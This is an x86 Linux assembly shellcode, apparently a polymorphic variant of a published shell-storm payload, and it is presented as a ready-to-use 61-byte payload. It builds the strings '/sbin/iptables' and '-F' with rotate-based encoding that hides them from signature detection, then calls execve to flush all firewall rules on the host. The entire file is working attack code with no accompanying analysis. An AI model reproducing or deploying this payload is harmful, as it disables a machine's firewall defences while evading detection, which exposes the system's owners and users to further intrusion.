; iptables polymorphic http://shell-storm.org/shellcode/files/shellcode-825.php
; 61 bytes
; Author: rikih gunawan

global _start

_start:
    xor eax,eax
    push eax
    push word 0x8c5a  ; -F : ror 1
    ror word [esp], 1
    mov esi,esp

    push eax
    push 0xe6cad8c4   ; selb : ror 1
    ror dword [esp], 1
    push 0xc2e8e0d2   ; atpi : ror 1
    ror dword [esp], 1
    push 0x5e5edcd2   ; /nib : ror 1
    ror dword [esp], 1
    push 0xc4e65e5e   ; bs// : ror 1
    ror dword [esp], 1
    mov ebx,esp
    
    push eax          ; null
    push esi          ; F-
    push ebx          ; selbatpi//nibs//
    mov ecx,esp
    
    mov  edx,eax
    mov  al,0xe
    sub  al,0x3
    int  0x80